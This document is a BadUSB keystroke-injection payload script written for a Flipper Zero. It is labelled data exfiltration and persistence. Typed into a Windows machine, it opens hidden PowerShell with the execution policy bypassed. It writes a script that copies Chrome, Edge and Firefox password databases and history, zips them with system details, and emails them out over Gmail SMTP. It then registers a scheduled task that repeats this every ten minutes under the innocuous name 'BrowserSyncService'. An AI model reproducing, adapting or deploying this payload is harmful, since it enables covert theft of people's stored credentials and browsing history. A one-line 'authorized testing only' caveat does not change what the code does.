REM =====================================================
REM Title: Windows Browser Data to Gmail Sync
REM Author: yogeshjoga
REM Target: Windows 10/11
REM Category: Data Exfiltration / Persistence
REM Description: Creates scheduled task to sync all browser data to Gmail every 10 minutes
REM =====================================================
REM
REM FUNCTIONALITY:
REM 1. Prompts user for target Gmail address
REM 2. Creates PowerShell script to extract browser data
REM 3. Sets up Windows Task Scheduler (every 10 minutes)
REM 4. Syncs Chrome, Edge, Firefox passwords & history
REM 5. Emails data via Gmail SMTP
REM
REM REQUIREMENTS:
REM - Gmail App Password (will be embedded in script)
REM - Internet connection for sync
REM - PowerShell execution policy bypass
REM
REM WARNING: For authorized testing only!
REM =====================================================

DELAY 2000

REM Open PowerShell as Administrator (if possible, otherwise regular)
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
ENTER
DELAY 2000

REM Create the main sync script directory
STRING $syncDir = "$env:APPDATA\BrowserSync"
ENTER
DELAY 300

STRING New-Item -ItemType Directory -Force -Path $syncDir | Out-Null
ENTER
DELAY 500

REM Prompt user for target Gmail address
STRING Add-Type -AssemblyName Microsoft.VisualBasic
ENTER
DELAY 300

STRING $targetEmail = [Microsoft.VisualBasic.Interaction]::InputBox('Enter Gmail address for sync:', 'Browser Sync Setup')
ENTER
DELAY 500

STRING if([string]::IsNullOrWhiteSpace($targetEmail)) { exit }
ENTER
DELAY 300

REM Prompt for Gmail App Password
STRING $appPassword = [Microsoft.VisualBasic.Interaction]::InputBox('Enter Gmail App Password (16 chars):', 'Gmail Authentication')
ENTER
DELAY 500

STRING if([string]::IsNullOrWhiteSpace($appPassword)) { exit }
ENTER
DELAY 300

REM Create the main sync PowerShell script
STRING @"
ENTER
DELAY 200

STRING # Browser Data Sync to Gmail
ENTER
STRING # Auto-generated by Flipper Zero
ENTER
STRING # Target: $targetEmail
ENTER
DELAY 300

STRING `$ErrorActionPreference = 'SilentlyContinue'
ENTER
STRING `$targetEmail = '$targetEmail'
ENTER
STRING `$appPassword = '$appPassword'
ENTER
STRING `$computerName = `$env:COMPUTERNAME
ENTER
STRING `$userName = `$env:USERNAME
ENTER
DELAY 500

STRING # Function to check internet connectivity
ENTER
STRING function Test-InternetConnection {
ENTER
STRING     try {
ENTER
STRING         `$test = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet
ENTER
STRING         return `$test
ENTER
STRING     } catch { return `$false }
ENTER
STRING }
ENTER
DELAY 500

STRING # Function to extract Chrome passwords
ENTER
STRING function Get-ChromePasswords {
ENTER
STRING     `$chromePath = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
ENTER
STRING     if(Test-Path `$chromePath) {
ENTER
STRING         `$tempDb = "`$env:TEMP\chrome_login_$(Get-Random).db"
ENTER
STRING         Copy-Item `$chromePath `$tempDb -Force
ENTER
STRING         return `$tempDb
ENTER
STRING     }
ENTER
STRING     return `$null
ENTER
STRING }
ENTER
DELAY 500

STRING # Function to extract Chrome history
ENTER
STRING function Get-ChromeHistory {
ENTER
STRING     `$historyPath = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
ENTER
STRING     if(Test-Path `$historyPath) {
ENTER
STRING         `$tempDb = "`$env:TEMP\chrome_history_$(Get-Random).db"
ENTER
STRING         Copy-Item `$historyPath `$tempDb -Force
ENTER
STRING         return `$tempDb
ENTER
STRING     }
ENTER
STRING     return `$null
ENTER
STRING }
ENTER
DELAY 500

STRING # Function to extract Edge passwords
ENTER
STRING function Get-EdgePasswords {
ENTER
STRING     `$edgePath = "`$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
ENTER
STRING     if(Test-Path `$edgePath) {
ENTER
STRING         `$tempDb = "`$env:TEMP\edge_login_$(Get-Random).db"
ENTER
STRING         Copy-Item `$edgePath `$tempDb -Force
ENTER
STRING         return `$tempDb
ENTER
STRING     }
ENTER
STRING     return `$null
ENTER
STRING }
ENTER
DELAY 500

STRING # Function to extract Edge history  
ENTER
STRING function Get-EdgeHistory {
ENTER
STRING     `$historyPath = "`$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
ENTER
STRING     if(Test-Path `$historyPath) {
ENTER
STRING         `$tempDb = "`$env:TEMP\edge_history_$(Get-Random).db"
ENTER
STRING         Copy-Item `$historyPath `$tempDb -Force
ENTER
STRING         return `$tempDb
ENTER
STRING     }
ENTER
STRING     return `$null
ENTER
STRING }
ENTER
DELAY 500

STRING # Function to extract Firefox data
ENTER
STRING function Get-FirefoxData {
ENTER
STRING     `$ffProfile = Get-ChildItem "`$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue | Select-Object -First 1
ENTER
STRING     if(`$ffProfile) {
ENTER
STRING         `$logins = Join-Path `$ffProfile.FullName "logins.json"
ENTER
STRING         `$history = Join-Path `$ffProfile.FullName "places.sqlite"
ENTER
STRING         `$result = @{}
ENTER
STRING         if(Test-Path `$logins) { `$result['logins'] = `$logins }
ENTER
STRING         if(Test-Path `$history) { 
ENTER
STRING             `$tempDb = "`$env:TEMP\ff_history_$(Get-Random).db"
ENTER
STRING             Copy-Item `$history `$tempDb -Force
ENTER
STRING             `$result['history'] = `$tempDb
ENTER
STRING         }
ENTER
STRING         return `$result
ENTER
STRING     }
ENTER
STRING     return @{}
ENTER
STRING }
ENTER
DELAY 500

STRING # Function to create data archive
ENTER
STRING function Create-DataArchive {
ENTER
STRING     `$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
ENTER
STRING     `$archivePath = "`$env:TEMP\BrowserData_`$timestamp.zip"
ENTER
STRING     `$tempFolder = "`$env:TEMP\BrowserExtract_$(Get-Random)"
ENTER
STRING     New-Item -ItemType Directory -Path `$tempFolder -Force | Out-Null
ENTER
DELAY 500

STRING     # Extract all browser data
ENTER
STRING     `$chromePass = Get-ChromePasswords
ENTER
STRING     `$chromeHist = Get-ChromeHistory
ENTER
STRING     `$edgePass = Get-EdgePasswords
ENTER
STRING     `$edgeHist = Get-EdgeHistory
ENTER
STRING     `$firefoxData = Get-FirefoxData
ENTER
DELAY 500

STRING     # Copy to temp folder
ENTER
STRING     if(`$chromePass) { Copy-Item `$chromePass "`$tempFolder\chrome_passwords.db" -Force }
ENTER
STRING     if(`$chromeHist) { Copy-Item `$chromeHist "`$tempFolder\chrome_history.db" -Force }
ENTER
STRING     if(`$edgePass) { Copy-Item `$edgePass "`$tempFolder\edge_passwords.db" -Force }
ENTER
STRING     if(`$edgeHist) { Copy-Item `$edgeHist "`$tempFolder\edge_history.db" -Force }
ENTER
STRING     if(`$firefoxData['logins']) { Copy-Item `$firefoxData['logins'] "`$tempFolder\firefox_logins.json" -Force }
ENTER
STRING     if(`$firefoxData['history']) { Copy-Item `$firefoxData['history'] "`$tempFolder\firefox_history.db" -Force }
ENTER
DELAY 500

STRING     # Create info file
ENTER
STRING     `$info = @"
ENTER
STRING Computer: `$computerName
ENTER
STRING User: `$userName
ENTER
STRING Timestamp: `$(Get-Date)
ENTER
STRING OS: `$(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
ENTER
STRING "@
ENTER
STRING     `$info | Out-File "`$tempFolder\system_info.txt"
ENTER
DELAY 500

STRING     # Compress
ENTER
STRING     Compress-Archive -Path "`$tempFolder\*" -DestinationPath `$archivePath -Force
ENTER
DELAY 300

STRING     # Cleanup temp files
ENTER
STRING     Remove-Item `$tempFolder -Recurse -Force
ENTER
STRING     if(`$chromePass) { Remove-Item `$chromePass -Force }
ENTER
STRING     if(`$chromeHist) { Remove-Item `$chromeHist -Force }
ENTER
STRING     if(`$edgePass) { Remove-Item `$edgePass -Force }
ENTER
STRING     if(`$edgeHist) { Remove-Item `$edgeHist -Force }
ENTER
DELAY 300

STRING     return `$archivePath
ENTER
STRING }
ENTER
DELAY 500

STRING # Function to email data via Gmail
ENTER
STRING function Send-DataEmail {
ENTER
STRING     param(`$archivePath)
ENTER
DELAY 300

STRING     try {
ENTER
STRING         `$smtp = New-Object System.Net.Mail.SmtpClient('smtp.gmail.com', 587)
ENTER
STRING         `$smtp.EnableSsl = `$true
ENTER
STRING         `$smtp.Credentials = New-Object System.Net.NetworkCredential(`$targetEmail, `$appPassword)
ENTER
DELAY 500

STRING         `$msg = New-Object System.Net.Mail.MailMessage
ENTER
STRING         `$msg.From = `$targetEmail
ENTER
STRING         `$msg.To.Add(`$targetEmail)
ENTER
STRING         `$msg.Subject = "Browser Sync - `$computerName - `$(Get-Date -Format 'yyyy-MM-dd HH:mm')"
ENTER
STRING         `$msg.Body = "Automated browser data sync from `$computerName (`$userName)`n`nTimestamp: `$(Get-Date)"
ENTER
DELAY 500

STRING         # Attach archive
ENTER
STRING         if(Test-Path `$archivePath) {
ENTER
STRING             `$attachment = New-Object System.Net.Mail.Attachment(`$archivePath)
ENTER
STRING             `$msg.Attachments.Add(`$attachment)
ENTER
STRING         }
ENTER
DELAY 300

STRING         `$smtp.Send(`$msg)
ENTER
STRING         `$msg.Dispose()
ENTER
DELAY 300

STRING         # Cleanup
ENTER
STRING         if(Test-Path `$archivePath) { Remove-Item `$archivePath -Force }
ENTER
DELAY 300

STRING         return `$true
ENTER
STRING     } catch {
ENTER
STRING         return `$false
ENTER
STRING     }
ENTER
STRING }
ENTER
DELAY 500

STRING # Main execution
ENTER
STRING if(Test-InternetConnection) {
ENTER
STRING     `$archive = Create-DataArchive
ENTER
STRING     if(`$archive) {
ENTER
STRING         Send-DataEmail -archivePath `$archive | Out-Null
ENTER
STRING     }
ENTER
STRING }
ENTER
DELAY 300

STRING "@ | Out-File -FilePath "`$syncDir\BrowserSync.ps1" -Encoding UTF8
ENTER
DELAY 1000

REM Create batch file wrapper
STRING @"
ENTER
STRING @echo off
ENTER
STRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%APPDATA%\BrowserSync\BrowserSync.ps1"
ENTER
STRING "@ | Out-File -FilePath "`$syncDir\RunSync.bat" -Encoding ASCII
ENTER
DELAY 500

REM Create Windows scheduled task
STRING `$action = New-ScheduledTaskAction -Execute "`$syncDir\RunSync.bat"
ENTER
DELAY 300

STRING `$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration ([TimeSpan]::MaxValue)
ENTER
DELAY 500

STRING `$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
ENTER
DELAY 500

STRING `$principal = New-ScheduledTaskPrincipal -UserId "`$env:USERNAME" -LogonType S4U -RunLevel Limited
ENTER
DELAY 500

STRING Register-ScheduledTask -TaskName "BrowserSyncService" -Action `$action -Trigger `$trigger -Settings `$settings -Principal `$principal -Force | Out-Null
ENTER
DELAY 1000

REM Run initial sync
STRING Start-Process -FilePath "`$syncDir\RunSync.bat" -WindowStyle Hidden
ENTER
DELAY 500

REM Show success message
STRING Add-Type -AssemblyName System.Windows.Forms
ENTER
DELAY 300

STRING [System.Windows.Forms.MessageBox]::Show("Browser sync configured successfully!`n`nTarget: $targetEmail`nFrequency: Every 10 minutes`n`nScheduled task created: BrowserSyncService", "Setup Complete", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
ENTER
DELAY 500

REM Exit
STRING exit
ENTER
